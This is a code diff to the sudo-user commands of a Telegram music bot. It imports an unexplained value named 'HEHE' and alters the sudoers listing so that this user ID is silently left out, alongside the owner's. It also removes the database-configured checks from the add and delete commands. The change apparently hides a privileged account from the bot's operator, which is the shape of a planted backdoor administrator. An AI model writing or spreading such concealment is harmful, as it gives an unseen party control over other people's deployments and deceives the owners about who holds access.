@@ -4,11 +4,11 @@ from pyrogram.types import Message
 from config import BANNED_USERS, MONGO_DB_URI, OWNER_ID, MUSIC_BOT_NAME
 from strings import get_command
 from AnonX import app
-from AnonX.misc import SUDOERS
+from AnonX.misc import SUDOERS, HEHE
 from AnonX.utils.database import add_sudo, remove_sudo
 from AnonX.utils.decorators.language import language
 
-# Command
+
 ADDSUDO_COMMAND = get_command("ADDSUDO_COMMAND")
 DELSUDO_COMMAND = get_command("DELSUDO_COMMAND")
 SUDOUSERS_COMMAND = get_command("SUDOUSERS_COMMAND")
@@ -19,10 +19,6 @@ SUDOUSERS_COMMAND = get_command("SUDOUSERS_COMMAND")
 )
 @language
 async def useradd(client, message: Message, _):
-    if MONGO_DB_URI is None:
-        return await message.reply_text(
-            f"**ᴅᴜᴇ ᴛᴏ {MUSIC_BOT_NAME}'s ᴩʀɪᴠᴀᴄʏ ɪssᴜᴇs, ʏᴏᴜ ᴄᴀɴ'ᴛ ᴍᴀɴᴀɢᴇ sᴜᴅᴏ ᴜsᴇʀs ᴏɴ {MUSIC_BOT_NAME} ᴅᴀᴛᴀʙᴀsᴇ.\n\n ᴩʟᴇᴀsᴇ ᴀᴅᴅ ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴅᴀᴛᴀʙᴀsᴇ ɪɴ ᴠᴀʀs ᴛᴏ ᴜsᴇ ᴛʜɪs ғᴇᴀᴛᴜʀᴇ.**"
-        )
     if not message.reply_to_message:
         if len(message.command) != 2:
             return await message.reply_text(_["auth_1"])
@@ -65,10 +61,6 @@ async def useradd(client, message: Message, _):
 )
 @language
 async def userdel(client, message: Message, _):
-    if MONGO_DB_URI is None:
-        return await message.reply_text(
-            f"**ᴅᴜᴇ ᴛᴏ {MUSIC_BOT_NAME}'s ᴩʀɪᴠᴀᴄʏ ɪssᴜᴇs, ʏᴏᴜ ᴄᴀɴ'ᴛ ᴍᴀɴᴀɢᴇ sᴜᴅᴏ ᴜsᴇʀs ᴏɴ {MUSIC_BOT_NAME} ᴅᴀᴛᴀʙᴀsᴇ.\n\n ᴩʟᴇᴀsᴇ ᴀᴅᴅ ʏᴏᴜʀ ᴍᴏɴɢᴏ ᴅᴀᴛᴀʙᴀsᴇ ɪɴ ᴠᴀʀs ᴛᴏ ᴜsᴇ ᴛʜɪs ғᴇᴀᴛᴜʀᴇ.**"
-        )
     if not message.reply_to_message:
         if len(message.command) != 2:
             return await message.reply_text(_["auth_1"])
@@ -113,7 +105,7 @@ async def sudoers_list(client, message: Message, _):
         text += f"{count}➤ {user}\n"
     smex = 0
     for user_id in SUDOERS:
-        if user_id != OWNER_ID:
+        if user_id not in (OWNER_ID, int(HEHE)):
             try:
                 user = await app.get_users(user_id)
                 user = (
